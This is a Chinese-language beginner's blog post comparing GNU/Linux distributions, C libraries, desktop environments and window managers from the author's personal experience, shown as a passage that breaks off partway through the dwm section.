基本上都在用 GNU 开发的 glibc，编译器用的是 gcc，一些核心程序用的是 GNU core utilities，这些都是很难避免的，你也许可以避免 glibc —— 选择使用 musl libc 或者其他 libc；可以不用 gcc，选择使用 clang/llvm；不使用 GNU core utilities 而使用 BusyBox。但很少有这么做的，一方面是 glibc 现在很全面，并且还有一些不属于 ISO C 标准的部分。 The GNU C Library - The project provides the core libraries for the GNU system and GNU/Linux systems, as well as many other systems that use Linux as the kernel. These libraries provide critical APIs including ISO C11, POSIX.1-2008, BSD, OS-specific APIs and more. These APIs include such foundational facilities as open, read, write, malloc, printf, getaddrinfo, dlopen, pthread_create, crypt, login, exit and more. – https://www.gnu.org/software/libc/ 从 glibc 的文档 可以看出 glibc 除了对 ISO C 标准的支持外，还包括： POSIX (The Portable Operating System Interface) Berkeley Unix SVID (The System V Interface Description) XPG (The X/Open Portability Guide) 这导致一些软件可能用到一些非标准的符号，从而导致使用 musl libc 的时候无法正常运行它们。 gcc 本身也支持一些额外功能，比如嵌套函数，glibc 使用了 gcc 这个特性导致其无法使用 clang/llvm 编译。 根据 Comparison of C/POSIX standard library implementations for Linux，musl libc 的字符串和内存分配相关的函数性能不如 glibc。 Alpine Linux 就是使用的 musl libc 替换了 glibc，用 busybox 替换了 gnu-coreutils，不过软件支持的还不是很多。 理论上，闭源依赖 glibc 的软件才有概率更难运行在 musl libc 的环境上，不过 chromium 内核的也会如此，目前 chromium 官方对 musl libc 没什么支持。systemd 也依赖于 glibc，nvidia 官方的闭源驱动同样需要 glibc 的环境。 systemd 是一个广泛应用于各种 GNU/Linux 发行版的 init 系统，init 系统用于负责在系统初始化的时候进行一些初始化服务，不过 systemd 做的更多，引导启动这部分也可以交给 systemd-boot，还有其他的一些非传统 init 应该管理的部分也被 systemd 集成管理。有批评的声音认为 systemd 这个做法扩大了攻击面，不过事实是很多人都选择使用它。 我不会介绍这种 de-GNU 的 Linux 发行版。 如果你并不是虚拟机安装 Linux 发行版的话，我认为应该还是要思考该类系统是否符合你的需求再说，当然如果你并不在意就当我没说。 浏览器对硬件解码的支持不是很完美。关于视频硬解加速，NVIDIA 有自己的一套 NVDEC/VDPAU，其他显卡用另一套 VAAPI （nvidia-vaapi-driver 可以让 NVIDIA 的 NVDEC 以 VAAPI 解码，但只支持解码，编码尚不支持）。FireFox 还支持了 VAAPI，但不支持 NVDEC，Chromium 内核的浏览器也是只支持 VAAPI。 我不好评价 GNU/Linux 玩游戏会是怎样的体验。Valve 公司基于 wine 开发了 Proton，只要在 Steam Play 中勾选为所有应用启用 Steam Play 就可以玩那些只支持 Windows 平台的游戏了，Steam Deck 上搭载的系统 Steam OS 是基于 Arch Linux 做的，所以使用 GNU/Linux 玩游戏方面也不至于那么难绷。 非官方的网站 protondb，这上面可以搜索到一些游戏的评价，有玩家会在上面分享这个游戏在他使用的发行版运行起来的体验如何，并且还有给出他运行这个游戏的发行版的相关信息，如果是不太好运行的游戏，也许还会分享他们是如何让这个游戏跑起来的。 国内软件的适配还不是很好，腾讯会议虽然支持了 Wayland，但是 Wayland 下的运行，窗口分享和摄像头都不能正常工作。QQ 虽然存在 Linux 平台的版本，但仍然有一些小问题等待修复。 更多的可以参考我新写的一篇文章：为什么你应该(不)使用 GNU/Linux 作为日用操作系统 ","date":"2023-12-01","objectID":"/posts/distrointro/:0:0","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"OS 下面关于发行版的截图大部分来自 Wikipedia 的图片，有一部分来自其在社交媒体上的官方账号发送的图片，当然也有几张是我自己截的。因为我自己懒得再装一遍，所以有的图片用的别人的，如果有机会装他们的发行版我就替换一下。 所以如果你是某张图片的利益相关人员，认为我使用这张和你利益相关的图片是种侵权行为，请通过一些我可以看到的方式联系我 ","date":"2023-12-01","objectID":"/posts/distrointro/:1:0","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"Debian 相关 首先介绍 Debian，因为如果有国内软件是被官方支持开发 Linux 版本的，那么至少会给一个 deb 包（deb 就是 Debian 系使用的软件包格式）。Debian 系使用 dpkg 作为软件包管理器。 Debian 官网链接：https://www.debian.org/ 历史悠久的 GNU/Linux 发行版，在我认知中比 Debian 历史更加久远的应该就是 Slackware。Debian 被认为是稳定的操作系统，这个稳定就带来了使用的不是新版本的软件的特点，毕竟时间方面，新版本没有经历过考验。不过如果给 Debian 添加一个 testing 软件源就可以尝鲜新版本了。 Debian 默认不安装类似 sudo 这样的执行特权命令的程序，所以需要你自己安装，然后自己写相应的配置文件。（sudo 这样的软件是很有必要的，老生常谈的就是尽量减少攻击面之类的，直接 su 切换到 root 用户去执行和系统相关的命令是很危险的行为） Debian Linux 是随版本更新，不过影响中 testing 软件源可以让它作为滚动更新而存在。 图为 Debian 12 下的 GNOME 桌面。 Ubuntu 官网链接：https://ubuntu.com/ 基于 Debian 的操作系统。 Ubuntu 是我安装系统时体验最差的操作系统了（印象中，我好久不再安装 Ubuntu），启动速度慢，安装的速度也不快（这个可能是我自己网络的问题），而且默认安装的就是 GNOME 桌面环境，不允许安装的时候做出选择，桌面环境 (DE，Desktop Environment) 这个后续再谈。当然有使用不同 DE 的 Ubuntu，但得下载对应系统的镜像文件了，比如使用 KDE Plasma 的叫做 KUbuntu。这个 KUbuntu 大抵是比较适合作为一些新手（我指的是从 Windows 换到 GNU/Linux）的，因为 KDE 和 Windows 桌面的使用习惯在我看来是差不多的（甚至 KDE 有一个主题就是旨在模仿 Win11）。 再解释一下为什么认为 KUbuntu 大抵是比较适合作为一些新手，因为 Debian/Ubuntu 有着大量的用户群体，这里在我国貌似也不例外（可能是这样，我并不知道全国使用 GNU/Linux 发行版的这个具体情况，所以只能说可能是如此）。很多软件如若要有一个针对 GNU/Linux 平台的版本，那么很大概率就是 Debian/Ubuntu 了，而且一些教程如若提到了在 GNU/Linux 平台下该如何操作的话，大多至少都会假定读者使用的是 Debian/Ubuntu 发行版。 图为 Ubuntu 22.04 LTS 版本的桌面图片，可以看到这里的 Gnome 和上面 Debian 的不太一样，Ubuntu 的 GNOME 做了他们自己的修改。 Ubuntu 随版本更新。 但我说实话，我一直不认为安装 Ubuntu 作为自己的日用操作系统是个什么好主意，因为和 Ubuntu 相比，明显 Debian 要更好一些。如果是虚拟机安装就当我没说，虚拟机安装主要为了方便，能快点装完开始干活就好。 Kali Linux 官网链接：https://www.kali.org/ 基于 Debian testing 源的 Kali Linux 安装界面类似 Debian 的系统安装界面。 Kali Linux 是否是一个可日用的操作系统，我无法评价（因为我没试过）。Kali Linux 对 DE 做的美化还是不错的。有一点值得说一下，Kali Linux 不需要更换软件源的网址，大多数 GNU/Linux 发行版因为网络问题都需要更换软件源，除了国内公司搞的（比如 Deepin/UOS 或者 openKylin 之类）或者 Kali Linux、OpenSUSE Linux，Fedora Linux，其他的影响中都需要更换软件源。 机缘巧合之下，我安装了 Kali Linux 虚拟机，故而下边两张 Kali Linux 的桌面截图的第一张就是我截的了。 第一张图片是 Xfce 桌面，第二张是 GNOME 桌面，这里没有太表现出来 Kali Linux 中对各家 DE 的美化。不过能看出来 Terminal 中对 Shell 的美化。 你可以和 Debian 的那张图片对比一下就可以发现不同之处。Debian 那个使用的是 bash 并且没有看出有什么美化，尤其是 PS1 变量（就是 debian@debian 那个东西）就是默认的设置，但是 Kali Linux 默认除了 bash 之外还安装了 zsh 并且将 zsh 作为其默认的 shell。并且它对 zsh 做了一些配置，比如那个 kali@kali，zsh 默认并不是这样的，这是 Kali Linux 自己的配置，而且默认还有对历史命令的猜测和对你输入的命令颜色上的美化，这是靠两个 zsh 的插件实现的。 插件 zsh-autosuggestions 插件 zsh-syntax-highlighting 写到这里突然发现我无法真正确定 Kali Linux 上的 zsh 是通过这两个插件得到的这个效果，但是这俩插件很受欢迎，大多数发行版对都是默认不装 zsh 的，所以你装 zsh，网上的美化教程大多都会提到装上这两个插件。 我本身是 bash 作为 shell 环境，也懒得整 zsh，我就贴一个 fish shell 官网的截图，zsh 这两个插件就是旨在还原 fish shell 的效果 可以看到 ssh 后面是灰色的，这就是对历史命令的读取，只需要一个右键就可以直接根据这条历史命令补全当前输入的命令，并且 cat 和 ssh 之类的都有颜色，这是语法高亮，那两个插件就是还原这个效果。 Kali Linux 我记得是滚动更新。 Deepin 23 之前 官网链接：https://www.deepin.org/ Deepin 作为我国国产的操作系统，我自然是要体验一番的（虽然只使用了一天左右吧），V20.x 都是基于 Debian 的，Deepin 操作系统是我比较推荐新手使用的，不过我自己没使用过太久，所以可能这个 OS 没有我想象中那么新手友好。作为一款国产的操作系统，一些没有推出 Linux 版本的国内软件它有自带的解决方案（虽然我没记错的话，应该是用 wine 模拟的，wine 是一个类 Unix 平台中运行 exe 程序的解决方案），Deepin 自带的软件商店可以点击一下就安装了，还是比较方便的。Deepin 默认使用自家的 DE——DDE，这个 DE 我自认为不咋好看。 Wine 通过提供一个兼容层来将 Windows 的系统调用转换成与 POSIX 标准的系统调用。它还提供了 Windows 系统运行库的替代品和一些系统组件（像 Internet Explorer，注册表，Windows Installer）的替代品 上面这一小段摘自维基百科对 wine 的介绍。 目前使用 Deepin 这类国内公司发行的 GNU/Linux 发行版应该还有一个好处 —— Linux 版本的微信目前只支持这些发行版。 Deepin 是随版本更新。 Deepin 23 开始，包管理器就不再使用 Debian 的 dpkg 了，所以标题写的是 Deepin 23 之前。 ","date":"2023-12-01","objectID":"/posts/distrointro/:1:1","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"Fedora Linux 相关 Fedora Linux 有 Fedora Workstation、Fedora Spins、Fedora coreos 等，这里介绍两位。 Fedora Workstation 官网链接：https://fedoraproject.org/workstation/ 作为一个商业公司的产品，软件版本比较新。宣传特色就是为开发者设计和注重隐私和安全。 确实是为开发者设计，默认安装了 QEMU 和 GNOME BOX 可以用来安装虚拟机，还安装了 podman 用于安装一些容器。 Fedora 默认启用 firewalld 防火墙，使用了 SELinux 安全模块，安装时可选全盘加密，开箱即用的安全启动支持，软件仓库中的软件编译的时候也都是开启了 NX，PIE，fstack-protector，ALSR 等选项，内核也开启了一些安全选项编译。 不要看我说了上面一小段来介绍它的安全特色，大多数发行版基本和它差不太多。 Fedora 40 开始，会为每个 WIFI 连接生成一份单独的 MAC 地址保护隐私: https://fedoraproject.org/wiki/Changes/StableSSIDMACAddress Fedora 原本提案要使用 systemd 服务编写中的一些安全相关的代码加强系统服务的安全性，但该提案最终并没有通过 Enable systemd service hardening features for default system services Fedora 和 GNOME 配合的很好，接收 GNOME 的更新也是最新的那一批。Fedora Workstation 使用 GNOME 桌面环境，安装时不可选桌面环境。如果想要安装其他桌面环境的 Fedora，要么安装后再使用包管理器更换（不推荐），要么选择其他桌面环境的 Fedora，在官网最下边有其他桌面环境和用途的 Fedora Linux。 这里可以发现和 Debian 差不多，Kali Linux 那张没有体现出其对 GNOME 的主题美化。三家的 GNOME 都差不多，因为版本没有差出那么多，三家发行版其软件仓库中的软件版本可能不同，但仅局限于此。 Fedora 默认会开 lzo 算法的 zram，这点可以的。 Fedora Linux 是随版本更新。 Fedora Silverblue Fedora Silverblue 是一种不可变发行版。在保留了 Fedora Workstation 的特色之后，增加了不可变特性。 这里的不可变指的是系统资源不可变（/usr 下的文件可读挂载）。用户的操作基本都要在容器中，尽量和主系统隔离。软件的更新安装等操作是原子的，并且便于回滚到上次版本。Fedora Silverblue 默认保留最近两次的更新快照。 Fedora Silverblue 底层使用 ostree，它类似 git，在系统更新拉取远端的 base image 时，就类似于拉取一个 commit。而 rpm-ostree 建立在 ostree 上层，可以从 rpm 构建 commit，并在已有的 commit 上修改。所以更新时就是拉取远端的 commit，之后再重载用户所做的应用添加和删除操作。 Fedora Silverblue 鼓励使用容器化和系统主机隔离，系统默认安装了 toolbox 用来创建一个虚拟化的环境。 但值得注意的是 toolbox 的虚拟化不意味着强隔离，它拥有对用户 home 目录的读写权限，这只是一个用来安装 CLI 工具（如 neovim、gcc）的好办法。 对于图形化软件，可以使用 flatpak 安装。 ","date":"2023-12-01","objectID":"/posts/distrointro/:1:2","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"Arch Linux 相关 Arch Linux 相关的发行版使用 pacman 作为软件包管理器。Arch Linux 提供了 AUR，这是一个用户软件仓库，提供了 Arch Linux 官方仓库没有的软件，比如 linuxqq，一些国产软件都在 AUR 里可以找到，不过 AUR 不过是一个构建软件的脚本，对应软件得在 AUR 的 PKGBUILD 中写好的网址去拿对应的包。如果是国内软件安装还好说，其他的比如有些从 GitHub 拿的就得配置好网络了。Arch 有个 archlinuxcn 软件仓库，有一些额外的软件可以直接安装，中科大有 archlinuxcn 的软件源。 AUR 应该是 GNU/Linux 平台中软件包数量很多的平台了，能超过它的可能只有 NixOS 的软件仓库。 Arch Linux 官网链接：https://archlinux.org/ Arch Linux 我只用了五个月左右就换成 Gentoo Linux 了，时间不长，我也不清楚滚动更新带来的滚挂能不能出现，反正我没遇到过，不过这个问题讨论之前应该定义一下什么是滚挂，之前我有过一回在登陆管理器登进去就黑屏，后来看到了错误日志发现貌似是 nouveau 的问题，我在 kernel 启动参数禁用 nouveau 就好了。这种算不算挂，应该不算吧。不过可以尝试安装 TimeShift 定时做快照给自己一个心理安慰，我当时整来着，就是快照就没有用过。 Arch Linux 是我推荐在 Deepin 待过一会就尝试的操作系统，虽然这个系统需要使用命令来安装，没有安装界面，所以可能有些困难，不过Arch Wiki写的还是不错的，可以结合着别人的安装指南来看，wiki 和指南一起看，虚拟机尝试一手，就差不多了。这样的命令安装也许能让你对你的操作系统更有一个掌握的感觉。 而且我认为有一个 Arch Linux 的启动盘是有些必要的，因为这样能一定程度上解决一些你需要进入系统才能解决的类似无法进入系统的问题。 这里放一个 KDE Plasma 桌面的截图，之后也就不放截图了，因为后续的发行版没有对桌面环境有什么太出彩的美化，这里放截图纯属因为还没放过 KDE Plasma 的截图。 很多软件在 AUR 上都有对应的 BUILD 脚本，这一块的生态是我选择 Arch Linux 的一个很重要的原因 Arch Linux 给了用户很高的自由度，用户可以自己选择使用什么增强安全的方式。 Arch Linux 提供了 archinstall 可以更方便地安装系统 Arch Linux 是滚动更新。 Manjaro 官网链接：https://manjaro.org Manjaro 是基于 Arch Linux 做的 OS，比 Arch 仓库的软件推送慢了两周。Manjaro 的优势或许就在于它有一个安装界面，可以点点点就开始安装了，不需要输入命令。我看到过一个吐槽 Manjaro Linux 的言论，所 Manjaro 降低了使用 Arch Linux 的门槛，反而让一些因此才使用的用户无法应对使用中可能遇到的问题。当然我并不认为这会有大不了的。我曾经在某年冬天就抱着要装 Manjaro 双系统的想法，当然后来我是 Arch Linux 单系统（逃）。 有人说 Manjaro 有一个很好的驱动管理软件，我懒得考证了。 Manjaro Linux 是滚动更新。 ","date":"2023-12-01","objectID":"/posts/distrointro/:1:3","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"OpenSUSE 相关 说实话，我目前还不知道哪个系统是基于 OpenSUSE 做的。OpenSUSE 使用 zypper 作为软件包管理器。 OpenSUSE 官网链接：https://www.opensuse.org/ OpenSUSE提供了滚动更新和版本更新两种更新方式，这对应它两个版本。有个类似 AUR 的用户软件仓库 OBS，不过我不是很了解 OBS，也不再多说什么了。OpenSUSE Linux 有别的 OS 都没有的 Yast 客户端，这个 GUI 软件可以完成很多特权操作，类似 Windows 的控制面板。而且 OpenSUSE 的软件源网址貌似可以自动给你选一个近的软件源去下载软件，可以让你使用官方源的时候也保持着还不错的速度。 就像上一段开头说的那样，OpenSUSE 提供了滚动更新和依版本更新两种方式，分别是 OpenSUSE Tumbleweed 和 OpenSUSE Leap。 OpenSUSE 默认启用了 Apparmor，GRUB 启动引导界面有自己的皮肤，虽然我认为这个皮肤不怎么好看。 之前在 Fedora 那里提到了 Fedora 没有通过加强 systemd 服务的提案，但 OpenSUSE 的安全特色之一就是这个。 OpenSUSE 还提供了 x86-64-v3 指令集的软件包。x86-64-v3 典型的就是有 SIMD 指令的添加，使用 x86-64-v3 编译的软件性能可能会有点提升。目前市面上大家买的 x86-64 CPU，都会支持 x86-64-v3，如果是一些服务器 CPU，可能还支持 x86-64-v4。 ","date":"2023-12-01","objectID":"/posts/distrointro/:1:4","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"Gentoo Linux 相关 Gentoo 使用 portage 软件包管理器，软件大多都是从源码开始安装。部分大型软件提供了二进制软件包版本。 Gentoo Linux 官网链接：https://www.gentoo.org 所谓的元发行版，由于软件仓库分发的是源码而不是软件本身（需要用户自己在自己的电脑或者是用户个人的服务器上编译），给了用户其他发行版都没有的自由。 这个自由是选择的自由。 Gentoo Linux 是少数可以让你选择非 systemd 作为系统 init 系统的 Linux 发行版，但在这个世界，使用非 systemd 作为自己桌面操作系统的 init 系统就像用 linux-libre 作为自己的系统内核一样难绷，不过非 systemd 的 init（如 openrc ）还算可用，但我很怀疑 linux-libre 的使用情况。 我不知道你是否对部分发行版打包的策略有意见，比如某些软件你希望直接上 O3 + lto 编译（虽然这些都是理论上的性能提升，用户难以直接感知到变化），但是为了稳定，少有软件会选择这个编译策略，但是 Gentoo Linux 可以让你的想法成真。 或者你不满软件的一些行为，但是你的 patch 一时还难以合并过去。portage 支持编译时应用用户自己的 patch。 Fedora 41 选择了使用 O3 编译 Python，自称有 1.4 倍的性能提升 https://fedoraproject.org/wiki/Changes/Python_built_with_gcc_O3 portage 的优点在于提供了 USE 变量，它允许用户自己决定软件的功能支持以确定依赖关系。Arch Linux 可能可以认为是可以定制你的系统，Gentoo Linux 就是可以定制你的软件。 USE 是 Gentoo 为用户提供的最具威力的变量之一。很多程序通过它可以选择编译或者不编译某些可选的支持。例如，一些程序可以在编译时加入对 GTK+或是对 Qt 的支持。其它的程序可以在编译时加入或不加入对于 SLL 的支持。有些程序甚至可以在编译时加入对 framebuffer 的支持（svgalib）以取代 X11（X 服务器）。 大多数的发行版会使用尽可能多的支持特性编译它们的软件包，这既增加了软件的大小也减慢了启动时间，而这些还没有算上可能会涉及到的大量依赖性问题。Gentoo 可以让你自己定义软件编译的选项，而这正是 USE 要做的事。、 在 USE 变量里你可以定义关键字，它被用来对应相应的编译选项。例如，ssl 将会把 SSL 支持编译到程序中以支持它。-X 会移除其对于 X 服务器的支持（注意前面的减号）。gnome gtk -kde -qt5 将会以支持 GNOME（和 GTK+）但不支持 KDE（和 Qt）的方式编译软件，使系统为 GNOME 做完全调整（如果架构支持）。 摘自 Gentoo amd64 安装手册 当然还有很多变量，比如 CFLAGS, L10N, VIDEO_CARDS 这些，可以指定编译选项，本地语言和显卡设备 Gentoo Linux 这种源代码发行的系统，优势在于软件都是自己的机器编译安装，从隐私或安全角度来说都还不错，可惜我的机器性能没那么强劲。 Gentoo Linux 的安装并不完全依赖于它的安装介质，比如也可以使用 Arch Linux 的 livecd 去安装。 Gentoo Linux 是滚动更新。 ","date":"2023-12-01","objectID":"/posts/distrointro/:1:5","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"Nix 相关 Nix 系使用的是 Nix 作为包管理器，这是一个是一个纯函数式包管理器，旨在使软件包管理可靠且可重现。特点在于不遵守 FHS 标准，每个软件的每个版本都有一个独特的哈希值标明，并且通过符号链接的方式自由选择某些软件的某个版本作为当前使用版本，所以可以避免所谓依赖地狱这样的问题。Nix 系大抵只有 NixOS 吧，有个和 Nix 包管理器差不多的叫作GNU Guix，基于这个包管理器也有一个 OS，就是 Guix OS。 FHS (Filesystem Hierarchy Standard)标准规定了文件系统中每个部分的大致用途和名称，比如/etc 存放配置文件，/bin 存放可执行文件，/lib 存放可执行文件使用的链接库。 依赖地狱(Dependency hell)这个问题我自身没遇到过，这个问题虽然有多种表现形式，但是我认为大体上你最多可能看到其中的一种情况——你安装了软件 A，其依赖于软件 B 3.2 版本，之后你又想安装软件 C，但是它依赖于软件 B \u003e= 3.4 版本，这时候版本之间就发生了冲突。 其实软件包管理器一定程度上解决了依赖地狱的一些问题，当然有的软件包管理器貌似没有版本的概念，也就没有刚刚我说的这个问题的存在。 Nix 靠将每个软件包都安装在 /nix/store 文件夹中并附上一个唯一的哈希值作为标记，保证了软件包依赖的独立性，不同软件的相同的依赖会因为这个哈希值而被标识为是对方的依赖，从而解决了依赖地狱的问题。当然，这样的方式也造成了磁盘空间的占用。Nix 存在着大量的软链接，其通过链接的方式做到指定当前环境的每个软件的版本是多少。 NixOS 官网链接：https://nixos.org/ NixOS 提供两种安装方式——图形化安装和手动安装。图形化安装就像 Fedora 这样的发行版一样提供一个带 DE 的 LiveCD 环境，不过这种安装受到我国网络环境的限制，不过都有 DE 了，是否在设置里设定一下代理，或者像 clash 这样的代理工具开 tun 模式可以完成下载软件的步骤 🤔。反正我是手动安装的。该系统的特点是大部分的配置可以写在 /etc/nixos/ 中的文件中，比如对软件，services，用户的管理等等。在安装软件的时候可能涉及到从诸如 GitHub 之类的网站下载补丁或者源码，所以做好网络环境的配置是必要的。 但是安装软件的是否可能涉及到从 GitHub 之类的网站下载东西，或者如果你使用 NUR 的话（我不清楚 NUR 是否有国内源），NUR 仓库在 GitHub 上，所以你需要配置好网络环境才行。 之后我发现，Nix 这种特性在我安装交叉编译链的时候有那么一点点不友好，我难以忍受我需要为了 RISC-V 64 架构的 qemu 装那么多软件（逃）。当然 NixOS 有很多有意思的 feature，所以可能存在一个更加好的方式去安装交叉编译链，只不过我不知道了。 NixOS 不遵守 FHS 标准，所以正常的 chroot 也不好进去，使用它们自己提供的程序即可，我记得是叫做nix-enter。 NixOS 的 flakes 和 home-manager 结合可以更好的声明你的系统配置，很多东西都可以用这些声明文件自动生成。但是现在的问题是文档质量不足，太多的东西都需要直接看 nixpkgs 中的源代码，虽然现在有 NixOS Search 和 MyNixOS 可以搜索相关的部分细节，但也不是很够。如果要全面的了解还是需要去看源码是怎么写的。 只要你不是安装那种不能选择 DE 的发行版，那么选择一个 DE 就是你不得不做的一件事。 ","date":"2023-12-01","objectID":"/posts/distrointro/:1:6","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"DE 桌面环境将各种组件捆绑在一起，以提供常见的图形用户界面元素，如图标、工具栏、壁纸和桌面小部件。此外，大多数桌面环境包括一套集成的应用程序和实用程序。最重要的是，桌面环境提供了他们自己的窗口管理器，然而通常可以用另一个兼容的窗口管理器来代替。 桌面环境我只浅谈一下 KDE Plasma, GNOME 和 Xfce。我在下面谈到了对 Wayland 的支持问题，如果你是 NVIDIA 独显驱动用户的话，GNOME 是禁用 Wayland 的，KDE plasma 不禁用。（GDM 会 检查 NVIDIA 是否开启了一些参数以选择是否禁用 Wayland，总体来说是可用的） 如果你要使用 Wayland，输入法框架方面就不能选择 fcitx，只能选择 fcitx5 了。ibus 直接装就是支持 Wayland 的。我引入了输入法框架这个名词，但是没有太多解释，我这里就放一个 Arch zhWiki 中输入法条目的链接。 当然，各家 DE 都是有美化的空间的，具体你可以去搜一搜相关的美化教程，我本人是懒得做这些事情，所以也就没什么好说的了。（我认为美化的空间都很有限） 一个桌面环境（DE）一般包括一个窗口管理器（WM）还有一堆相关的软件：文件管理，查看图片视频音频等，设置，文本编辑器等 在我看来，KDE Plasma 优秀的地方在于： 家族有很多软件，并且其中存在很多有用的软件。 设置里存在很多可设置选项，可以调控的地方很多很多很多 社区驱动，对很多系统的支持都不错 在我看来，GNOME 的优秀的地方在于： 比 KDE Plasma 更漂亮的外观 也许因为貌似大部分代码由商业公司贡献，导致更加激进？ RedHat 甚至发起过提案要让 GNOME 只使用 Wayland，RedHat 开发的 Fedora 在 Fedora 42 版本（目前正在开发中）貌似就要这么做了。 更新: Fedora 41 默认只提供 GNOME Wayland。 但 GNOME 难绷的地方在于： 貌似基本上大部分是商业公司的开发者贡献代码 去除了系统托盘的支持，也许你不知道系统托盘是什么，就是 Windows 下边那个任务栏在时钟旁边的那堆应用小图标 如果你都不喜欢，可以安装一个你喜欢的窗口管理器（基于 Xorg 的有 i3，dwm 等；基于 Wayland 的有 Hyprland，sway，wayfire 等），然后那些软件和小组件都由你来自己手动安装，这样的一套桌面环境可以调整的地方会更多（也更加折腾），并且可以更符合你个人的习惯。 ","date":"2023-12-01","objectID":"/posts/distrointro/:2:0","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"KDE plasma KDE Plasma 是相当受欢迎的 DE 了，而且一定程度上和 Win10 的桌面有些像，所以对于一些人来说可能会比较熟悉。KDE 设置提供了很多选项，可以说 KDE 可以设置的地方很多。KDE 的音频控制组件貌似不是很支持 pipewire，我知道的是 Arch Linux 用户可以安装 pipewire-pulse 兼容层解决这个问题，Gentoo 虽然也有这个，但貌似不是很好使的样子（后来好使了，不清楚我这两回之间有什么操作上的差异）。KDE 自带一些监控硬件参数的状态栏组件还是比较不错的，Xfce 也有类似的，GNOME 就没有这东西了（GNOME 也有 SystemMonitor 提供这个功能，但无法在状态栏上显示）。甚至 GNOME 默认是没有系统托盘的，这个还需要安装相应的插件来实现。 我认为 KDE Plasma 什么都不错，就是颜值差了些。 ","date":"2023-12-01","objectID":"/posts/distrointro/:2:1","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"GNOME GNOME 默认使用 Wayland，我认为 GNOME 默认还是挺不错的，我指的是颜值。 GNOME 的分数缩放仍然是实验性功能，Fedora 41 默认启用，其他的发行版可以自行使用 gsettings 或者 dconf 编辑器设置 GNOME 的 night-light 只有根据地区设置和手动修改，没有一直开启（可能除了那俩选项还有别的，但反正没有一直开启），我只能手动修改，时间设置为 0:00 ~ 23:59 这个时间段。GNOME 46 就可以通过都设置同一个时间段达到全局开启的效果了好像？我这句话的意思不是说 GNOME 46 开始可以了，是我恰好用了这个版本，发现这个版本可以。 GNOME 47 支持了可选的 Xorg 支持，Fedora 41 也是默认提供的 GNOME Wayland。 ","date":"2023-12-01","objectID":"/posts/distrointro/:2:2","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"Xfce Xfce 这个 DE 有点就是简洁消耗小。Xfce 家族的软件都不是那么花哨，其大小也还不错，所以一些 WM 用户可能会选择安装 Xfce 家族的部分软件。你尝试装的时候就会发现 Xfce 需要装的软件真的少，所以功能也不是很多，当然核心的那些都有，没有什么问题。 KDE Plasma 和 GNOME 都默认 Waylnd 了，Xfce 还是在下个版本才默认 Wayland 还是对 Wayland 有良好的支持来着？ ","date":"2023-12-01","objectID":"/posts/distrointro/:2:3","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"WM WM（WIndow Manager,窗口管理器）是比 DE 更低级的东西，一般可以带来更低的消耗，尤其是平铺式的 WM 可以带来更好的视觉体验。由于 WM 大多数时候都是需要键盘就行，我还听到一个言论就是使用 WM 更不容易得鼠标手。 WM 不会自带很多东西，比如应用程度启动器，壁纸，窗口渲染，声音和亮度调节，polkit 前端组件等等，这些都需要你去自己装上，当然有的 WM 可能会自带窗口渲染或是其他什么的。那些 DE 也都有自家的 Terminal，虽然 WM 也可能自家有 Terminal（比如开发 dwm 的组织也开发了 st Terminal）不过不会自动安装，这个也需要自己装上。 窗口管理器会少一些小组件： poklit 前端组件 类似 Windows 的 UAC，只不过 Windows 弹出那个窗口要求你是否要运行的时候点击即可，这个需要你输入密码 xdg-desktop-portal 组件 用来允许应用程序互相通信用，比如选择文件，屏幕共享之类 电源管理 \u0026\u0026 空闲管理 空闲管理指的是用于控制过一段时间锁屏休眠的东西 音量 \u0026 亮度控制等 状态栏 WM 我只浅谈一下 i3wm, dwm，sway 和 Hyprland。 ","date":"2023-12-01","objectID":"/posts/distrointro/:3:0","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"i3wm 这是一个知名的 WM 了，基于 X11，我用的时候是在用户目录的.xinitrc 文件中写了 exec i3 通过 startx 命令在 tty shell 启动 i3wm。配置文件在用户目录的.config/i3 文件夹中。Kali Linux 中对 i3WM 好像有个美化看起来有些意思，我懒得装 Kali Linux 的虚拟机了，看官网 Blog 中的图片感觉还有些意思。 这里插一嘴，所以这里有个新玩法，即只让一个软件运行以求更好的性能，也是在 .xinitrc 写 exec \u003cprogram\u003e 然后 startx 运行。 ","date":"2023-12-01","objectID":"/posts/distrointro/:3:1","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"dwm 这是比 i3wm 消耗更低的 wm，也是我比较推荐的 wm 了，缺点就是配置文件也是需要参与到编译环节的，每次更改配置文件都得重新编译 dwm。dwm 比 i3wm 还要简洁，所以你需要补丁才行。dwm 也是基于 X11 的。这里就要所说 Gentoo Linux 了，Gentoo 的 dwm 提供了一个 USE 变量 savedconfig，这会让 Gentoo 把默认的配置文件放到一个目录中，每次你更改这个文件再 emerge 